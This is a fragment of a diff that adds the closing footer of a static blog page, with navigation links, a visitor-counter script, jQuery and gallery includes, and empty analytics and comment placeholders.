+          <li><a href="/tags/">標籤</a></li>
+         
+          <li><a href="/about/">吾</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">舊文</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
